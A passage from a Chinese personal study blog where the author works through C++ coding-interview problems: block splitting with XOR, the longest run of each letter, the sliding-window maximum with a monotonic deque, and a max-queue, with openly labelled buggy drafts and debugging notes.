<h2 id="输入描述-15"><a href="#输入描述-15" class="headerlink" title="输入描述"></a>输入描述</h2><blockquote>
<p>3<br>3 5 6<br>第一行是一个整数N(2≤N≤100)，表示有多少块积木；</p>
<p>第二行为空格分开的N个整数Ci(1≤Ci≤10^6)，表示第i块积木的重量。</p>
</blockquote>
<h2 id="输出描述-15"><a href="#输出描述-15" class="headerlink" title="输出描述"></a>输出描述</h2><blockquote>
<p>11<br>让koko不哭，输出Solo所能获得积木的最大总重量；否则输出“NO”。</p>
</blockquote>
<h2 id="个人代码-8"><a href="#个人代码-8" class="headerlink" title="个人代码"></a>个人代码</h2><p>参考了<a href="https://wiki.amoscloud.com/zh/ProgramingPractice/NowCoder/Adecco/Topic0107">题目0107-分积木 | AmosCloud Wiki</a></p>
<blockquote>
<p>其思想</p>
<p>1.如果该数组的值满足“可分配”条件，全部一起异或，最终值一定为0</p>
<p>2.关于最终结果为总和减去最小值</p>
<p>举个例子</p>
<p>3 5 6</p>
<p>最小值是3，同时减去3</p>
<p>0 2 3</p>
<p>全部异或，一定为0，暂时这样理解吧。不懂</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">/*</span><br><span class="line">两人获得积木总重量相等</span><br><span class="line"></span><br><span class="line">计算方式，任意i个积木重量之和等于另外k-i个二进制相加(直接异或)的十进制之和</span><br><span class="line">第一行为积木数</span><br><span class="line">第二行为各积木重量</span><br><span class="line">目的，分配重量相等</span><br><span class="line">*/</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // int a=25,b=11;</span><br><span class="line">    // cout&lt;&lt;(a^b);</span><br><span class="line">    int n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    vector&lt;int&gt; a(n);</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line"></span><br><span class="line">    // for(int s:a)</span><br><span class="line">    //     cout&lt;&lt;s&lt;&lt;&quot;,&quot;;</span><br><span class="line">    int solo=0,coco=0;</span><br><span class="line">    //这怎么搞呢，solo=coco，这些数怎么拼凑呢</span><br><span class="line">    //假如有5个数,保证两边个数可以不同，但和相同</span><br><span class="line">    //solo  i个数 cooc n-i个数</span><br><span class="line">    //暴力解法怎么做？</span><br><span class="line">    //？？？？？？？？？？？？？</span><br><span class="line">    </span><br><span class="line">    //看了wp，其思路为相同的值异或为0</span><br><span class="line">    /*</span><br><span class="line">    该思想是异或到底，得到值为0，则成功</span><br><span class="line">    减去最小数字即可</span><br><span class="line">    */</span><br><span class="line">    int num=a[0],sum=num,tmp=num;</span><br><span class="line">    for(int k=1;k&lt;n;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum+=a[k];</span><br><span class="line">        num=min(num,a[k]);</span><br><span class="line">        tmp^=a[k];</span><br><span class="line">    &#125;</span><br><span class="line">    if(tmp!=0) cout&lt;&lt;&quot;NO&quot;;</span><br><span class="line">    else cout&lt;&lt;sum-num;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="19-连续字母长度"><a href="#19-连续字母长度" class="headerlink" title="*19 连续字母长度"></a>*19 连续字母长度</h1><h2 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>给定一个字符串，只包含大写字母，求在包含同一字母的子串中，长度第 k 长的子串的长度，相同字母只取最长的那个子串。</p>
</blockquote>
<h2 id="输入描述-16"><a href="#输入描述-16" class="headerlink" title="输入描述"></a>输入描述</h2><blockquote>
<p>第一行有一个子串(1&lt;长度&lt;&#x3D;100)，只包含大写字母。<br>第二行为 k的值</p>
</blockquote>
<h2 id="输出描述-16"><a href="#输出描述-16" class="headerlink" title="输出描述"></a>输出描述</h2><blockquote>
<p>输出连续出现次数第k多的字母的次数。</p>
</blockquote>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>输入1</p>
<blockquote>
<p>AAAAHHHBBCDHHHH<br>3</p>
</blockquote>
<p>输出1</p>
<blockquote>
<p>2</p>
</blockquote>
<p>输入2</p>
<blockquote>
<p>AABAAA<br>2</p>
</blockquote>
<p>输出2</p>
<blockquote>
<p>1</p>
</blockquote>
<h2 id="个人代码-不完整"><a href="#个人代码-不完整" class="headerlink" title="个人代码(不完整)"></a>个人代码(不完整)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">/*</span><br><span class="line">给定一个字符串，只包含大写字母，</span><br><span class="line">求在包含同一字母的子串中，长度第 k 长的子串的长度，</span><br><span class="line">相同字母只取最长的那个子串。</span><br><span class="line"></span><br><span class="line">AAAAHHHBBCDHHHH</span><br><span class="line">3</span><br><span class="line">输出2</span><br><span class="line">说明：同一字母最长的子串中，A为4，H为4(H为3去掉)，B为2，C为1,D为1</span><br><span class="line"></span><br><span class="line">AABAAA</span><br><span class="line">2</span><br><span class="line">输出1</span><br><span class="line">说明：A取最长的为3,B为1</span><br><span class="line">*/</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">struct cmp</span><br><span class="line">&#123;</span><br><span class="line">    bool operator()(pair&lt;char,int&gt; &amp;a,pair&lt;char,int&gt; &amp;b)</span><br><span class="line">    &#123;</span><br><span class="line">        return a.second&gt;b.second;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    /*</span><br><span class="line">    初始思路：需要统计相同字母的子串最大长度，还要排序。</span><br><span class="line">    1.那就map键值对,记录还要排个序，难点在于排序</span><br><span class="line">    2.直接vector，最后排序一下，难点在于相同字母不同长度的取舍:</span><br><span class="line">    那还要再额外建立一个vector标记A,B,C咯？</span><br><span class="line"></span><br><span class="line">    试试第一个吧</span><br><span class="line">    */</span><br><span class="line">   string s;</span><br><span class="line">   cin&gt;&gt;s;</span><br><span class="line">   int n;</span><br><span class="line">   cin&gt;&gt;n;</span><br><span class="line">   map&lt;char,int&gt; mp;</span><br><span class="line">   mp[s[0]]=1;</span><br><span class="line">   char pre=s[0];</span><br><span class="line">   int co=1;//该值长度为1</span><br><span class="line">   for(int i=1;i&lt;s.size();i++)</span><br><span class="line">   &#123;</span><br><span class="line">       if(pre==s[i])</span><br><span class="line">       &#123;</span><br><span class="line">        co++;</span><br><span class="line">       &#125;</span><br><span class="line">       else//如果当前值与pre不等</span><br><span class="line">       &#123;</span><br><span class="line">            if(mp.count(pre)) //如果有这个字符，更新一下最大值</span><br><span class="line">            &#123;</span><br><span class="line">                if(mp[pre]&lt;co)</span><br><span class="line">                    mp[pre]=co;</span><br><span class="line">            &#125;</span><br><span class="line">            else//没有就添加这个字符</span><br><span class="line">            &#123;</span><br><span class="line">                //mp[pre]=1;</span><br><span class="line">                mp[s[i]]=1;</span><br><span class="line">            &#125;</span><br><span class="line">            pre=s[i]; //更新一下pre</span><br><span class="line">            co=1;//置为1</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   for(pair&lt;char,int&gt; list:mp)</span><br><span class="line">   &#123;</span><br><span class="line">    cout&lt;&lt;list.first&lt;&lt;&quot;,&quot;&lt;&lt;list.second&lt;&lt;endl;</span><br><span class="line">   &#125;</span><br><span class="line">    vector&lt; pair&lt;char,int&gt; &gt;mp2(mp.begin(),mp.end());</span><br><span class="line">   //没有考虑不同字母，相同长度的情况</span><br><span class="line">    sort(mp2.begin(),mp2.end(),cmp());</span><br><span class="line">    </span><br><span class="line">//    for(pair&lt;char,int&gt; list:mp2)</span><br><span class="line">//    cout&lt;&lt;list.first&lt;&lt;&quot;,&quot;&lt;&lt;list.second&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>aaaaabbbccd<br>3<br>a,5<br>c,2</p>
</blockquote>
<blockquote>
<p>abcccdd<br>2<br>a,1<br>c,3</p>
</blockquote>
<p>嘶，为什么会漏键值对呢。</p>
<p>近距离聚焦一波</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=1;i&lt;s.size();i++)</span><br><span class="line"> &#123;</span><br><span class="line">     if(pre==s[i])</span><br><span class="line">     &#123;</span><br><span class="line">           co++;</span><br><span class="line">     &#125;</span><br><span class="line">     else//如果当前值与pre不等</span><br><span class="line">     &#123;</span><br><span class="line">          if(mp.count(pre)) //如果有这个字符，更新一下最大值</span><br><span class="line">          &#123;</span><br><span class="line">              if(mp[pre]&lt;co)</span><br><span class="line">                  mp[pre]=co;</span><br><span class="line">          &#125;</span><br><span class="line">          else//没有就添加这个字符</span><br><span class="line">          &#123;</span><br><span class="line">              //mp[pre]=1;</span><br><span class="line">              mp[s[i]]=1;</span><br><span class="line">          &#125;</span><br><span class="line">          pre=s[i]; //更新一下pre</span><br><span class="line">          co=1;//置为1</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>更新后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=1;i&lt;s.size();i++)</span><br><span class="line">  &#123;</span><br><span class="line">      if(pre==s[i])</span><br><span class="line">      &#123;</span><br><span class="line">            co++;</span><br><span class="line">      &#125;</span><br><span class="line">      else//如果当前值与pre不等</span><br><span class="line">      &#123;</span><br><span class="line">           if(mp.count(pre)) //如果有这个字符，更新一下最大值</span><br><span class="line">           &#123;</span><br><span class="line">               if(mp[pre]&lt;co)</span><br><span class="line">                   mp[pre]=co;</span><br><span class="line">           &#125;</span><br><span class="line">          // else//没有就添加这个字符</span><br><span class="line">          // &#123;</span><br><span class="line">               //mp[pre]=1;</span><br><span class="line">               </span><br><span class="line">           mp[s[i]]=1; //并将未知值添加进来</span><br><span class="line">          // &#125;</span><br><span class="line">           pre=s[i]; //更新一下pre</span><br><span class="line">           co=1;//置为1</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>abcccdd<br>2<br>a,1<br>b,1<br>c,3<br>d,1</p>
</blockquote>
<p>怎么最后一个值没添上去嘞</p>
<p>当最后一个字符，是连续字符时，没有及时更新。</p>
<h2 id="个人代码-9"><a href="#个人代码-9" class="headerlink" title="个人代码"></a>个人代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">/*</span><br><span class="line">给定一个字符串，只包含大写字母，</span><br><span class="line">求在包含同一字母的子串中，长度第 k 长的子串的长度，</span><br><span class="line">相同字母只取最长的那个子串。</span><br><span class="line"></span><br><span class="line">AAAAHHHBBCDHHHH</span><br><span class="line">3</span><br><span class="line">输出2</span><br><span class="line">说明：同一字母最长的子串中，A为4，H为4(H为3去掉)，B为2，C为1,D为1</span><br><span class="line"></span><br><span class="line">AABAAA</span><br><span class="line">2</span><br><span class="line">输出1</span><br><span class="line">说明：A取最长的为3,B为1</span><br><span class="line">*/</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">struct cmp</span><br><span class="line">&#123;</span><br><span class="line">    bool operator()(pair&lt;char,int&gt; &amp;a,pair&lt;char,int&gt; &amp;b)</span><br><span class="line">    &#123;</span><br><span class="line">        return a.second&gt;b.second;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    /*</span><br><span class="line">    初始思路：需要统计相同字母的子串最大长度，还要排序。</span><br><span class="line">    1.那就map键值对,记录还要排个序，难点在于排序</span><br><span class="line">    2.直接vector，最后排序一下，难点在于相同字母不同长度的取舍:</span><br><span class="line">    那还要再额外建立一个vector标记A,B,C咯？</span><br><span class="line"></span><br><span class="line">    试试第一个吧</span><br><span class="line">    */</span><br><span class="line">   string s;</span><br><span class="line">   cin&gt;&gt;s;</span><br><span class="line">   int n;</span><br><span class="line">   cin&gt;&gt;n;</span><br><span class="line">   map&lt;char,int&gt; mp;</span><br><span class="line">   mp[s[0]]=1;</span><br><span class="line">   char pre=s[0];</span><br><span class="line">   int co=1;//该值长度为1</span><br><span class="line">   for(int i=1;i&lt;s.size();i++)</span><br><span class="line">   &#123;</span><br><span class="line">       if(pre==s[i])</span><br><span class="line">       &#123;</span><br><span class="line">             co++;</span><br><span class="line">       &#125;</span><br><span class="line">       else//如果当前值与pre不等</span><br><span class="line">       &#123;</span><br><span class="line"></span><br><span class="line">        //把前者更新</span><br><span class="line">            if(mp.count(pre)) //如果有这个字符，更新一下最大值</span><br><span class="line">            &#123;</span><br><span class="line">                if(mp[pre]&lt;co)</span><br><span class="line">                    mp[pre]=co;</span><br><span class="line">            &#125;</span><br><span class="line">           // else//没有就添加这个字符</span><br><span class="line">           // &#123;</span><br><span class="line">                //mp[pre]=1;</span><br><span class="line"></span><br><span class="line">        //并将当前字符添加进来</span><br><span class="line">            mp[s[i]]=1; //</span><br><span class="line">           // &#125;</span><br><span class="line">            pre=s[i]; //更新一下pre</span><br><span class="line">            co=1;//置为1</span><br><span class="line">       &#125;</span><br><span class="line">       //最后如果是连续值，更新</span><br><span class="line">       if(mp.count(pre)) //如果有这个字符，更新一下最大值</span><br><span class="line">            &#123;</span><br><span class="line">                if(mp[pre]&lt;co)</span><br><span class="line">                    mp[pre]=co;</span><br><span class="line">            &#125;</span><br><span class="line">   &#125;</span><br><span class="line">//    for(pair&lt;char,int&gt; list:mp)</span><br><span class="line">//    &#123;</span><br><span class="line">//     cout&lt;&lt;list.first&lt;&lt;&quot;,&quot;&lt;&lt;list.second&lt;&lt;endl;</span><br><span class="line">//    &#125;</span><br><span class="line">    vector&lt; pair&lt;char,int&gt; &gt;mp2(mp.begin(),mp.end());</span><br><span class="line">    </span><br><span class="line">   //不同字母，相同长度的情况是并列排序的</span><br><span class="line">    sort(mp2.begin(),mp2.end(),cmp()); //map默认按键排序，自定义按值排序</span><br><span class="line">    </span><br><span class="line">//    for(pair&lt;char,int&gt; list:mp2)</span><br><span class="line">//    cout&lt;&lt;list.first&lt;&lt;&quot;,&quot;&lt;&lt;list.second&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;mp2[n-1].second;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="标星知识点"><a href="#标星知识点" class="headerlink" title="标星知识点"></a>标星知识点</h2><p>map的键的唯一，(去重)</p>
<p>vector&lt; pair&lt;&gt; &gt;与map的关系</p>
<p>前值与当前值</p>
<h1 id="20-滑动窗口最大值"><a href="#20-滑动窗口最大值" class="headerlink" title="*20.滑动窗口最大值"></a>*20.滑动窗口最大值</h1><h2 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>给你一个整数数组 nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 k 个数字。滑动窗口每次只向右移动一位。</p>
<p>返回 滑动窗口中的最大值 。</p>
</blockquote>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><blockquote>
<p>输入：nums &#x3D; [1,3,-1,-3,5,3,6,7], k &#x3D; 3<br>输出：[3,3,5,5,6,7]<br>解释：<br>滑动窗口的位置                最大值</p>
<hr>
<p>[1  3  -1] -3  5  3  6  7       3<br>1 [3  -1  -3] 5  3  6  7       3<br>1  3 [-1  -3  5] 3  6  7       5<br>1  3  -1 [-3  5  3] 6  7       5<br>1  3  -1  -3 [5  3  6] 7       6<br>1  3  -1  -3  5 [3  6  7]      7</p>
</blockquote>
<h2 id="个人代码-10"><a href="#个人代码-10" class="headerlink" title="个人代码"></a>个人代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">给你一个整数数组 nums，</span><br><span class="line">有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧。</span><br><span class="line">你只可以看到在滑动窗口内的 k 个数字。滑动窗口每次只向右移动一位。</span><br><span class="line">返回 滑动窗口中的最大值 。</span><br><span class="line">*/</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">void bijiao(vector&lt;int&gt; a,int begin)</span><br><span class="line">&#123;</span><br><span class="line">    int maxn=a[begin];</span><br><span class="line">    for(int i=begin;i&lt;a.size();i++)</span><br><span class="line">        maxn=max(maxn,a[i]);</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;maxn;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;int&gt; nums;</span><br><span class="line">    //int num;</span><br><span class="line">    string s;</span><br><span class="line">    getline(cin,s);</span><br><span class="line">    stringstream ss(s);</span><br><span class="line">    string t;</span><br><span class="line">    while(getline(ss,t,&#x27;,&#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">        nums.push_back(stoi(t));</span><br><span class="line">    &#125;</span><br><span class="line">    int k;</span><br><span class="line">    cin&gt;&gt;k;</span><br><span class="line"></span><br><span class="line">   vector&lt;int&gt; a;</span><br><span class="line">    //窗口大小为k，每次处理完，右移</span><br><span class="line">    //那就是第一次添加k个数</span><br><span class="line">    //之后每添加一个数就进行比较，输出</span><br><span class="line">    int co=0;</span><br><span class="line">    for(int i=0;i&lt;nums.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a.push_back(nums[i]);</span><br><span class="line">        co++;</span><br><span class="line">        if(co==k) break;</span><br><span class="line">    &#125;</span><br><span class="line">//1,3,-1,-3,5,3,6,7</span><br><span class="line">    co=k;</span><br><span class="line">    bijiao(a,0);</span><br><span class="line">    int i=1;</span><br><span class="line">    while(co&lt;nums.size())</span><br><span class="line">    &#123;</span><br><span class="line">        a.push_back(nums[co]);</span><br><span class="line">        cout&lt;&lt;&quot; &quot;;</span><br><span class="line">        bijiao(a,i);</span><br><span class="line">        i++;</span><br><span class="line">        co++;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="力扣代码-有误"><a href="#力扣代码-有误" class="headerlink" title="力扣代码(有误)"></a>力扣代码(有误)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; b;</span><br><span class="line">    vector&lt;int&gt; maxSlidingWindow(vector&lt;int&gt;&amp; nums, int k) &#123;</span><br><span class="line">          vector&lt;int&gt; a;</span><br><span class="line"></span><br><span class="line">          //初始k个值</span><br><span class="line">          for(int i=0;i&lt;k;i++)</span><br><span class="line">            a.push_back(nums[i]);</span><br><span class="line"></span><br><span class="line">        //对值进行比较</span><br><span class="line">        bijiao(a,0);</span><br><span class="line">        int i=1,co=k;</span><br><span class="line">        while(co&lt;nums.size())</span><br><span class="line">        &#123;</span><br><span class="line">            a.push_back(nums[co]);</span><br><span class="line">            bijiao(a,i);</span><br><span class="line">            i++;</span><br><span class="line">            co++;</span><br><span class="line">        &#125;</span><br><span class="line">        return b;</span><br><span class="line">    &#125;</span><br><span class="line"> void bijiao(vector&lt;int&gt; a,int begin)</span><br><span class="line">    &#123;</span><br><span class="line">        int maxn=a[0]; //错误之处 =a[begin]即可</span><br><span class="line">        for(int i=begin;i&lt;a.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            maxn=max(maxn,a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        b.push_back(maxn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>嘶，按理说没毛病诶</p>
<p>针对[1,-1] 1</p>
<p>代码1是</p>
<blockquote>
<p>1 -1</p>
</blockquote>
<p>力扣是</p>
<blockquote>
<p>1,1</p>
</blockquote>
<p>针对[1,-2,0,4] 2</p>
<p>代码1是</p>
<blockquote>
<p>1 0 4</p>
</blockquote>
<p>力扣是</p>
<blockquote>
<p>1 1 4</p>
</blockquote>
<p>考虑是。。</p>
<p>哦，没事了，我在bijiao函数中的初始化不对，我<strong>标注</strong>了，不改了</p>
<p><strong>嗯，力扣，不出所料地超时了</strong></p>
<p>那就是双for的问题咯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int i=1,co=k;</span><br><span class="line">while(co&lt;nums.size())</span><br><span class="line">        &#123;</span><br><span class="line">            a.push_back(nums[co]);</span><br><span class="line">            bijiao(a,i);</span><br><span class="line">            i++;</span><br><span class="line">            co++;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">#include&lt;queue&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;int&gt; nums;</span><br><span class="line">    int num;</span><br><span class="line">    while(cin&gt;&gt;num)</span><br><span class="line">    &#123;</span><br><span class="line">        nums.push_back(num);</span><br><span class="line">        if(cin.get()==&#x27;\n&#x27;) break;</span><br><span class="line">    &#125;</span><br><span class="line">    int k;</span><br><span class="line">    cin&gt;&gt;k;</span><br><span class="line"></span><br><span class="line">    deque&lt;int&gt; q;//双端队列</span><br><span class="line">   vector&lt;int&gt; a;</span><br><span class="line">//    for(int i=0;i&lt;k;i++) //确保引进k个值，且末尾是最大的</span><br><span class="line">//    &#123;</span><br><span class="line">//     while(!q.empty()&amp;&amp;q.back()&lt;nums[i])</span><br><span class="line">//     &#123;</span><br><span class="line">//         q.pop_back();</span><br><span class="line">//     &#125;</span><br><span class="line">//     q.push_back(nums[i]);</span><br><span class="line">//   //  a.push_back(q.front());</span><br><span class="line">//    &#125;</span><br><span class="line">  //双端队列，用来保存单点递减队列，保持队首为最大值，为了确保窗口值，存储索引</span><br><span class="line">   for(int i=0;i&lt;nums.size();i++)</span><br><span class="line">   &#123;</span><br><span class="line">      while(!q.empty()&amp;&amp;nums[q.back()]&lt;=nums[i])//如果不空且末尾值&lt;=当前值</span><br><span class="line">        q.pop_back();//清除该值</span><br><span class="line"></span><br><span class="line">        q.push_back(i);//添加新下标</span><br><span class="line"></span><br><span class="line">        if(q.front()&lt; i-k+1) //q里已经有k+1个元素，删除左边值</span><br><span class="line">            q.pop_front();</span><br><span class="line">        if(i+1&gt;=k) //窗口形成</span><br><span class="line">        a.push_back(nums[q.front()]);</span><br><span class="line">   &#125;</span><br><span class="line">    for(int list:a)</span><br><span class="line">    cout&lt;&lt;list&lt;&lt;&quot;,&quot;;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="标星知识点-1"><a href="#标星知识点-1" class="headerlink" title="标星知识点"></a>标星知识点</h2><p>超时</p>
<p>wp说是<strong>单调队列结构</strong>：为了可以同时弹出队首和队尾的元素，我们需要使用双端队列。满足这种单调性的双端队列一般称作「单调队列」。</p>
<p>删除比待加入的小的值，直到遇见更大的值</p>
<blockquote>
<p>1.为什么用双端队列</p>
</blockquote>
<p>数组5,3,4,1</p>
<p>第一次入队 5</p>
<p>第二次入队 5 3</p>
<p>第三次入队 5 4 <strong>出现在这里</strong>，一般队列是back入，front出（即队尾入，队头出）；这里需要从back出。</p>
<p>第四次入队 5 4 1</p>
<p><a href="https://zhuanlan.zhihu.com/p/77981148">C++中queue和deque的区别 - 知乎 (zhihu.com)</a></p>
<blockquote>
<p>2.窗口值的维护</p>
</blockquote>
<p>用队列存储索引的好处就是，可以判断窗口值大小，进而移动窗口</p>
<p>如:5 3 4 1 k&#x3D;2</p>
<p>当入队了 5 3 判定当前值4</p>
<p>之后入队了是 5  4</p>
<p>因为4的索引为2，5的索引为0；i-k+1&#x3D;2-2+1，即3的下标为1</p>
<p>弹出5</p>
<p>哎，这样吧，<strong>虽然队列里的值可能不会满足k个值，但是通过加进来的值的下标，我们可以将队首下标与临界值i-k+1比较，小于就弹出</strong></p>
<blockquote>
<p>3.窗口值已定</p>
</blockquote>
<p>那就是当前下标值+1&gt;&#x3D;k</p>
<p>对于数组大小n，窗口m来说</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (int i = 0; i &lt; n - m + 1; i++) &#123;//决定窗口起始位置</span><br><span class="line">          int sum = 0;</span><br><span class="line">          for (int j = i; j &lt; i + m; j++) &#123;//决定了获取m个值</span><br><span class="line">              sum += integers.get(j);</span><br><span class="line">          &#125;</span><br><span class="line">          if (sum &gt; res) res = sum;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>



<h2 id="59-队列最大值"><a href="#59-队列最大值" class="headerlink" title="59.队列最大值"></a>59.队列最大值</h2><p>请定义一个队列并实现函数 max_value 得到队列里的最大值，要求函数max_value、push_back 和 pop_front 的均摊时间复杂度都是O(1)。</p>
<p>若队列为空，pop_front 和 max_value 需要返回 -1</p>
<h3 id="示例-1："><a href="#示例-1：" class="headerlink" title="示例 1："></a>示例 1：</h3><p>输入:<br>[“MaxQueue”,”push_back”,”push_back”,”max_value”,”pop_front”,”max_value”]<br>[[],[1],[2],[],[],[]]<br>输出: [null,null,null,2,1,2]<br>示例 2：</p>
<p>输入:<br>[“MaxQueue”,”pop_front”,”max_value”]<br>[[],[],[]]<br>输出: [null,-1,-1]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class MaxQueue &#123;</span><br><span class="line">    queue&lt;int&gt; que;</span><br><span class="line">    deque&lt;int&gt; deq;</span><br><span class="line">public:</span><br><span class="line">    MaxQueue() &#123; &#125;</span><br><span class="line">    int max_value() &#123;</span><br><span class="line">        return deq.empty() ? -1 : deq.front();</span><br><span class="line">    &#125;</span><br><span class="line">    void push_back(int value) &#123;</span><br><span class="line">        que.push(value);</span><br><span class="line">        while(!deq.empty() &amp;&amp; deq.back() &lt; value)</span><br><span class="line">            deq.pop_back();</span><br><span class="line">        deq.push_back(value);</span><br><span class="line">    &#125;</span><br><span class="line">    int pop_front() &#123;</span><br><span class="line">        if(que.empty()) return -1;</span><br><span class="line">        int val = que.front();</span><br><span class="line">        if(val == deq.front())</span><br><span class="line">            deq.pop_front();</span><br><span class="line">        que.pop();</span><br><span class="line">        return val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">作者：jyd</span><br><span class="line">链接：https://leetcode.cn/problems/dui-lie-de-zui-da-zhi-lcof/solution/jian-zhi-offer-59-ii-dui-lie-de-zui-da-z-0pap/</span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>

<p>什么意思，为什么要一个queue+一个deque呢？</p>
<blockquote>
<p>一个deque不就可以保持最大值吗。</p>
</blockquote>
<p>举例，</p>
<p>[“MaxQueue”,”push_back”,”push_back”,”max_value”,”pop_front”,”max_value”]<br>[[],[1],[2],[],[],[]]</p>
<p>如果只有deque，为了维持最大值</p>
<p>输入 1：队列情况 1</p>
<p>输入2：队列情况   2 (1被清除了)</p>
<p>此时最大值为2</p>
<p>那么又执行了pop_front，2被清楚了</p>
<p>队列没值了</p>
<p>那就会输出-1</p>
<p>所以需要一个普通队列按顺序进队，以防pop操作时，deque队列仅删掉一个最大值就出现空队列的情况</p>
<p>你看 queue : 1 2 pop操作后，还有2</p>
<p>​		deque : 输入1 2 那就只有2（因为该队列的作用是维持最大值在队首） pop后，队列空了</p>
<blockquote>
<p>而为什么一个queue不行，显而易见了</p>
</blockquote>
<p>一个普通队列无法保留单调的最值问题。</p>
<h1 id="21-素数之积"><a href="#21-素数之积" class="headerlink" title="21.素数之积"></a>21.素数之积</h1><p>RSA加密算法在网络安全世界中无处不在，它利用了极大整数因数分解的困难度，数据越大，安全系数越高。</p>
<p>给定一个32位正整数，请对其进行因数分解，找出是哪两个素数的乘积。</p>
<h2 id="输入描述-17"><a href="#输入描述-17" class="headerlink" title="输入描述"></a><strong>输入描述</strong></h2><p>一个正整数num</p>
<p>0 &lt; num &lt;&#x3D; 2147483647</p>
<h2 id="输出描述-17"><a href="#输出描述-17" class="headerlink" title="输出描述"></a><strong>输出描述</strong></h2><p>如果成功找到，以单个空格分割，从小到大输出两个素数，分解失败，请输出-1 -1。</p>
<h2 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1"></a><strong>示例1</strong></h2><p>输入输出示例仅供调试，后台判题数据一般不包含示例</p>
<p><strong>输入</strong></p>
<p><strong><code>15</code></strong></p>
<p><strong>输出</strong></p>
<p><strong><code>3 5</code></strong></p>
